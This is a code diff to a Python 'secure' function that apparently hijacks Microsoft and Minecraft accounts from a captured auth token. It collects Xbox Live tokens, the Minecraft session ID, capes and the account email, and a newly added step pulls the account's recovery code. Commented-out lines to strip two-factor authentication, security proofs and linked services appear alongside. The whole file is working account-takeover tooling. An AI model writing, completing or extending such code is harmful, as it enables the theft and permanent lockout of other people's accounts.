@@ -1,4 +1,5 @@
-# from views.utils.securityInformation import securityInformation
+from views.utils.securityInformation import securityInformation
+from views.utils.getRecoveryCode import getRecoveryCode
 from views.utils.getAccountInfo import getAccountInfo
 from views.utils.removeServices import removeServices
 from views.utils.removeProof import removeProof
@@ -12,6 +13,7 @@ from views.utils.getAMRP import getAMRP
 from views.utils.getSSID import getSSID
 from views.utils.getXBL import getXBL
 from views.utils.getT import getT
+import json
 
 def secure(msaauth: str):
 
@@ -62,7 +64,7 @@ def secure(msaauth: str):
     XBLResponse = getXBL(host)
 
     if XBLResponse:
-        print("[+] - Got XBL")
+        print("[+] - Got XBL (Has Xbox Profile)")
 
         # XBL && Token
         xbl = XBLResponse["xbl"]
@@ -70,7 +72,7 @@ def secure(msaauth: str):
         
         # Get capes, profile and purchase method
         if ssid:
-            print("[+] - Got SSID!")
+            print("[+] - Got SSID! (Has Minecraft)")
             accountInfo["SSID"] = ssid
 
             capes = getCapes(ssid)
@@ -131,11 +133,14 @@ def secure(msaauth: str):
 
             # remove2FA(amrp, cookies[1], cookies[2])
 
-            # removeProof(amrp, cookies[1], cookies[2], proofsID)
-            
-            # removeServices(amrp, cookies[0])
+            # To be fixed ###########################################
+            #                                                       #
+            # removeProof(amrp, cookies[1], cookies[2], proofsID)   #
+            # removeServices(amrp, cookies[2], cookies[0])          #
+            #                                                       #
+            #########################################################
 
-            accountMSInfo = getAccountInfo(amrp, cookies[2])
+            # accountMSInfo = getAccountInfo(amrp, cookies[2])
 
         #     accountInfo["firstName"] = accountMSInfo["firstName"]
         #     accountInfo["lastName"] = accountMSInfo["lastName"]
@@ -144,8 +149,29 @@ def secure(msaauth: str):
         #     accountInfo["birthday"] = accountMSInfo["birthday"]
         #     print("[+] -  Got Account Information")
 
-        #     securityParameters = securityInformation(amrp)
-        #     print("[+] - Got Security Parameters")
+            securityParameters = json.loads(securityInformation(amrp))
+            print("[+] - Got Security Parameters")
+
+            if securityParameters:
+
+                email = securityParameters["email"]
+                encryptedNetID = securityParameters["WLXAccount"]["manageProofs"]["encryptedNetId"] 
+
+                accountInfo["oldEmail"] = email
+                
+                recoveryCode = getRecoveryCode(
+                    amrp,
+                    cookies[1],
+                    cookies[2],
+                    encryptedNetID
+                )
+                print("[+] - Got Recovery Code")
+
+                accountInfo["recoveryCode"] = recoveryCode
+            
+    
+    return accountInfo
+
 
             
 
